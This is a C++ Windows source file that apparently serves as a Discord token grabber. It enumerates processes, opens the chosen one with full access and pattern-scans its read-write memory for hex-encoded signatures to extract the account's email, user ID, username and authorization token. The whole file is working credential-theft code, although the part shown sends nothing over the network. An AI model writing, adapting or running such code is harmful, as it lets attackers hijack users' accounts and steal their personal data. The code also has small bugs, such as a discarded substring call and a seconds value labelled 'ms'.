#include "proc.h"
#include <process.h>

// create object to struct
proc procInfo;



std::wstring GetProcName(DWORD aPid)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcout << "[+] Can't get a process snapshot ";
        return 0;
    }

    for (BOOL bok = Process32First(processesSnapshot, &processInfo);bok; bok = Process32Next(processesSnapshot, &processInfo))
    {
        if (aPid == processInfo.th32ProcessID)
        {
            CloseHandle(processesSnapshot);
            return processInfo.szExeFile;
        }

    }
    CloseHandle(processesSnapshot);
    return std::wstring();
}

DWORD getParentPID(DWORD pid)
{
    HANDLE h = NULL;
    PROCESSENTRY32 pe = { 0 };
    DWORD ppid = 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(h, &pe))
    {
        do
        {
            if (pe.th32ProcessID == pid)
            {
                ppid = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (ppid);
}

void procManager::findProc(uint32_t processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }
    // Print the process name and identifier.
    if (std::find(versions.begin(), versions.end(), szProcessName) != versions.end()) {
        DWORD parentPID = getParentPID(processID);
        std::wstring parent = GetProcName(parentPID);
        LPWSTR fname[MAX_PATH] = { 0 };

        // filter wrong proc
        // parent shares the same memory as all child processes so we want that
        if (parent == L"explorer.exe") {
            _tprintf(TEXT("[+] Found process: %s (PID: %u) \n"), szProcessName, processID);


            // convert TCHAR to string
            std::string procName(&szProcessName[0], &szProcessName[260]);

            // set values to struct procInfo defined in proc.h
            procInfo.name = procName;
            procInfo.pid = processID;
        }
        else if (parent.empty()) {
            _tprintf(TEXT("[+] Found process: %s (PID: %u) \n"), szProcessName, processID);


            // convert TCHAR to string
            std::string procName(&szProcessName[0], &szProcessName[260]);

            // set values to struct procInfo defined in proc.h
            procInfo.name = procName;
            procInfo.pid = processID;
        }
        else {
            count++;
        }
    }
    else {
        return;
    }


    // Release the handle to the process.

    CloseHandle(hProcess);

    return;

}

uint32_t GetProcessBaseAddress(DWORD processID)
{
    uint32_t   baseAddress = 0;
    HANDLE      processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    HMODULE* moduleArray;
    LPBYTE      moduleArrayBytes;
    DWORD       bytesRequired;

    if (processHandle)
    {
        if (EnumProcessModules(processHandle, NULL, 0, &bytesRequired))
        {
            if (bytesRequired)
            {
                moduleArrayBytes = (LPBYTE)LocalAlloc(LPTR, bytesRequired);

                if (moduleArrayBytes)
                {
                    unsigned int moduleCount;
                    moduleCount = bytesRequired / sizeof(HMODULE);
                    moduleArray = (HMODULE*)moduleArrayBytes;

                    if (EnumProcessModules(processHandle, moduleArray, bytesRequired, &bytesRequired))
                    {
                        baseAddress = (uint32_t)moduleArray[0];
                    }

                    LocalFree(moduleArrayBytes);
                }
            }
        }

        // release handle of process
        CloseHandle(processHandle);
    }

    return baseAddress;
}

bool isToken(char tokenBuffer[]) {

    // checks

    if (tokenBuffer[3] == '.') {
        return true;
    }
    else {
        return false;
    }
}
discordInformation procManager::scan() {
    // save information in discordInformation type
    discordInformation account;
    // JSON struct
    nlohmann::json accountJSON;

    // execution time
    std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now();
    // signatures
    char json_sig[] = "\x7b\x22\x65\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x22";
    char token_sig[] = "\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E\x00\x00\x00\x43";
    // Get the list of process identifiers.

    // 5th result is always the token
    int tokencount = 0;

    std::cout << "[+] Enumerating through all processes.." << std::endl;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        exit(EXIT_FAILURE); // error handling like a retard
    }

    // Calculate how many processes returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // loop trough every process and pass it to findProc to filter them out.
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            procManager::findProc(aProcesses[i]);
        }
    }
    _tprintf(TEXT("[+] Skipped %u wrong process(es) \n"), count);

    // open handle to the right proc
    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, false, procInfo.pid);

    // Get the mimum and maximum address space our JSON could be in
    SYSTEM_INFO info;

    GetSystemInfo(&info);
    MEMORY_BASIC_INFORMATION rgninfo{};

    rgninfo.BaseAddress;

    // allocate space to save json
    char resultJSON[140];
    char tokenJSON[128];

    bool found = false;

    char* base = (char*)GetProcessBaseAddress(procInfo.pid);

    std::cout << "[+] Reading .text section into buffer.." << std::endl;
    std::cout << "[+] Scanning.." << std::endl;

    while (base < info.lpMaximumApplicationAddress) {
        // get info for the current section
        VirtualQueryEx(hproc, (LPCVOID)base, &rgninfo, sizeof(rgninfo));

        // check if current section is rw (read write)
        // this is because only .text is rw 
        // which we want to scan trough

        if (rgninfo.Protect == PAGE_READWRITE) {
            // set buffer as big as the section we scan trough.
            byte* local = new byte[rgninfo.RegionSize];

            // counting the bytes read.
            SIZE_T read = 0;
            SIZE_T token_read = 0;

            // read memory into buffer
            ReadProcessMemory(hproc, base, local, rgninfo.RegionSize, &read);

            // pattern scan for the signature.
            uint32_t result = (uint32_t)scanner::Search(local, rgninfo.RegionSize, reinterpret_cast<const uint8_t*>(json_sig), strlen(json_sig), 0xCC);
            uint32_t token_result = (uint32_t)scanner::Search(local, rgninfo.RegionSize, reinterpret_cast<const uint8_t*>(token_sig), strlen(token_sig), 0xCC);

            // check if result has been found.
            if (token_result != 0) 
            {
                // if token hasnt been found read token value, else ignore and wait for other value to be found.
                if (!found) {
                    uint32_t offset(token_result - (uint32_t)local);

                    uint32_t token_add = ((uint32_t)rgninfo.BaseAddress + offset) + 0x18;

                    // Read value from address
                    ReadProcessMemory(hproc, (void*)token_add, tokenJSON, sizeof(tokenJSON), &read);
                }
                // validate token
                if (isToken(tokenJSON)) found = true;

            }

            // check if result has been found.
            if (result != 0)
            {
                // how many bytes we need to go from regionBase to the JSON start  
                uint32_t offset = (result - (uint32_t)local);

                // to read out a certain value which we dont use
                uint32_t json_add = ((uint32_t)rgninfo.BaseAddress + offset);

                // Read value from address
                ReadProcessMemory(hproc, (void*)json_add, resultJSON, sizeof(resultJSON), &read);

                // validate value, if it has been found waiting for the token to also be found.
                std::string result = resultJSON;
                if (result.find("\"id\"") != std::string::npos && found) {
                    break;
                }


            }
            // free memory.
            delete[] local;
        }

            // add regionsize to the base address of the process
            // since we already scanned trough that one
            base += rgninfo.RegionSize;
    }

        // convert JSON to string
        std::string JSONstring = resultJSON;

        // convert string to json object
        accountJSON = nlohmann::json::parse(JSONstring);

        // convert them all to string again
        std::string environment = accountJSON["environment"];
        std::string release = accountJSON["release"];
        std::string email = accountJSON["user"]["email"];
        std::string id = accountJSON["user"]["id"];
        std::string username = accountJSON["user"]["username"];
        std::string token = tokenJSON;

        // remove last character. (corrupted).
        token.substr(0, token.length() - 2);

        // pass string to struct
        account.environment = environment;
        account.release = release;
        account.user.email = email;
        account.user.id = id;
        account.user.username = username;
        account.user.token = token; 

        // execution time end
        std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();

        std::cout << "[+] Done in " << (std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count()) / 1000000.0 << "ms" << std::endl;

        // close handle
        CloseHandle(hproc);

        // return values
        return account;
}